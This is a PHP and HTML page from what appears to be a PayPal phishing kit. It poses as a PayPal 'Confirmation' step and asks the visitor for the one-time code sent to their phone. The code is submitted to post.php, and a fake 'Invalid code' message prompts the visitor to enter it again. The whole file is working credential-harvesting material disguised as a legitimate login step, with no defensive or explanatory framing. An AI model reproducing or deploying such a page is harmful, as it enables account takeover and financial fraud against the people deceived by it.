<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paypal</title>
    <link rel="stylesheet" href="res/css/main.css">
</head>
<body>
    
    <div class="container">       

        <div class="login">

            <img src="res/img/logo.png" class="logo">

            <h3>Confirmation</h3>
           <p>Please enter the code sent to your phone number to continue.</p>

            <form action="post.php" method="post">

            <input type="text" name="otp" required placeholder="Enter the code">
        
            <?php 
            if(isset($_GET['error'])){
            echo '<input type="hidden" name="exit">';
            echo '<p style="color:red;">Invalid code. Please try</p>';
            }
            ?>
                <button type="submit" class="log">Continue</button>
                
            </form>
        
        </div>
    </div>
</body>
</html>
